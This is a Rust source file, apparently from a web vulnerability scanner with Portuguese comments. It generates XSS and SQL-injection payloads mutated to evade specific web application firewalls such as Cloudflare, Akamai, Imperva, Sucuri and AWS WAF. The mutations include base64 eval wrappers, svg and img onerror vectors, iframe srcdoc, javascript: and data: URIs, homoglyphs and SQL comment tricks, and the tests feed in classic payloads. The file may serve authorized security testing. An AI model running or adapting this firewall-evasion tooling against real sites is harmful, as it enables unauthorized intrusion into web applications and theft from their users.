// scanner/rust_core/src/waf_payloads.rs
use rand::prelude::*;
use base64::Engine;
use serde::{Serialize, Deserialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MutatedPayload {
    pub id: String,
    pub payload: String,
    pub original: String,
}

pub struct PayloadMutator {
    rng: ThreadRng,
}

impl PayloadMutator {
    pub fn new() -> Self {
        Self { rng: thread_rng() }
    }
    
    // Técnicas de mutação
    fn case_mix(&mut self, payload: &str) -> String {
        payload.chars()
            .map(|c| if self.rng.gen_bool(0.5) { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() })
            .collect()
    }
    
    fn spacing(&self, payload: &str) -> String {
        payload.replace('<', "<%0a").replace('>', "%0a>")
    }
    
    fn tab_spacing(&self, payload: &str) -> String {
        payload.replace('<', "<%09").replace('>', "%09>")
    }
    
    fn comments(&self, payload: &str) -> String {
        payload.replace("<script", "<script<!--x-->").replace("</script", "</script<!--x-->")
    }
    
    fn url_encode(&self, payload: &str) -> String {
        urlencoding::encode(payload).to_string()
    }
    
    fn double_url(&self, payload: &str) -> String {
        let first = urlencoding::encode(payload).to_string();
        urlencoding::encode(&first).to_string()
    }
    
    fn html_entity(&self, payload: &str) -> String {
        payload.chars()
            .map(|c| format!("&#{};", c as u32))
            .collect()
    }
    
    fn unicode_homoglyph(&self, payload: &str) -> String {
        payload.replace('i', "\u{0456}") // i cirílico
    }
    
    fn base64_wrap(&self, payload: &str) -> String {
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
        format!("<script>eval(atob('{}'))</script>", b64)
    }
    
    fn svg_vector(&self, payload: &str) -> String {
        format!("<svg/onload={}>", payload)
    }
    
    fn img_vector(&self, payload: &str) -> String {
        format!("<img src=x onerror={}>", payload)
    }
    
    fn iframe_srcdoc(&self, payload: &str) -> String {
        format!("<iframe srcdoc='&lt;script&gt;{}&lt;/script&gt;'></iframe>", payload)
    }
    
    fn javascript_proto(&self, payload: &str) -> String {
        format!("javascript:{}", payload)
    }
    
    fn data_uri(&self, payload: &str) -> String {
        format!("data:text/html,<script>{}</script>", payload)
    }
    
    // Estratégias por WAF
    fn get_strategy(&self, vendor_hint: &str) -> Vec<fn(&mut PayloadMutator, &str) -> String> {
        match vendor_hint.to_lowercase().as_str() {
            "akamai" => vec![
                PayloadMutator::base64_wrap,
                PayloadMutator::html_entity,
                PayloadMutator::unicode_homoglyph,
                PayloadMutator::svg_vector,
                PayloadMutator::img_vector,
                PayloadMutator::case_mix,
                PayloadMutator::spacing,
            ],
            "cloudflare" => vec![
                PayloadMutator::spacing,
                PayloadMutator::comments,
                PayloadMutator::iframe_srcdoc,
                PayloadMutator::double_url,
                PayloadMutator::case_mix,
            ],
            "sucuri" => vec![
                PayloadMutator::url_encode,
                PayloadMutator::double_url,
                PayloadMutator::base64_wrap,
                PayloadMutator::javascript_proto,
            ],
            "imperva" => vec![
                PayloadMutator::html_entity,
                PayloadMutator::unicode_homoglyph,
                PayloadMutator::data_uri,
                PayloadMutator::iframe_srcdoc,
            ],
            "aws_waf" => vec![
                PayloadMutator::case_mix,
                PayloadMutator::spacing,
                PayloadMutator::comments,
                PayloadMutator::base64_wrap,
            ],
            _ => vec![
                PayloadMutator::case_mix,
                PayloadMutator::url_encode,
                PayloadMutator::base64_wrap,
                PayloadMutator::svg_vector,
            ],
        }
    }
    
    pub fn mutate(&mut self, base_payload: &str, vendor_hint: &str, count: usize) -> Vec<MutatedPayload> {
        let strategy = self.get_strategy(vendor_hint);
        let strategy_len = strategy.len();
        
        let mut results = Vec::new();
        for i in 0..count.min(strategy_len) {
            let mutator = strategy[i];
            let mutated = mutator(self, base_payload);
            results.push(MutatedPayload {
                id: format!("xss_{}", i),
                payload: mutated,
                original: base_payload.to_string(),
            });
        }
        
        results
    }
    
    pub fn mutate_sqli(&mut self, base_payload: &str, vendor_hint: &str, count: usize) -> Vec<MutatedPayload> {
        let mut results = Vec::new();
        
        // Técnicas específicas para SQLi
        let sqli_mutations: Vec<fn(&mut PayloadMutator, &str) -> String> = vec![
            |m, p| p.replace(' ', "/**/"),
            |m, p| p.replace(' ', "%09"),
            |m, p| m.url_encode(p),
            |m, p| m.double_url(p),
            |m, p| {
                let re = regex::Regex::new(r"(\W)").unwrap();
                re.replace_all(p, "$1/*!*/").to_string()
            },
        ];
        
        // Primeiro, usar mutações XSS base
        let xss_mutations = self.mutate(base_payload, vendor_hint, count / 2);
        results.extend(xss_mutations);
        
        // Depois, SQLi específicas
        for i in 0..count.min(sqli_mutations.len()) {
            let mutator = sqli_mutations[i];
            let mutated = mutator(self, base_payload);
            results.push(MutatedPayload {
                id: format!("sqli_{}", i),
                payload: mutated,
                original: base_payload.to_string(),
            });
        }
        
        results.truncate(count);
        results
    }
}

impl Default for PayloadMutator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_mutate_xss() {
        let mut mutator = PayloadMutator::new();
        let results = mutator.mutate("<script>alert(1)</script>", "cloudflare", 3);
        assert!(!results.is_empty());
        assert_eq!(results.len(), 3);
    }
    
    #[test]
    fn test_mutate_sqli() {
        let mut mutator = PayloadMutator::new();
        let results = mutator.mutate_sqli("' OR '1'='1", "akamai", 4);
        assert!(!results.is_empty());
    }
}